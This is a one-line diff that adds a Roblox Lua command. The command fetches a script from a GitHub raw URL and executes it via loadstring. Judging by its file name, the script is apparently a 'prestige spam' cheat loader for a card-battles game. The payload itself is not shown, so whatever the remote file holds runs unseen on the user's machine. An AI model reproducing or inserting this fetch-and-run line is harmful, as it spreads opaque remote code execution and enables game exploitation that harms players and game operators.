@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/upd-2-5-card-battles-prestige-spam7-696o3p3qoau58l.lua"))()
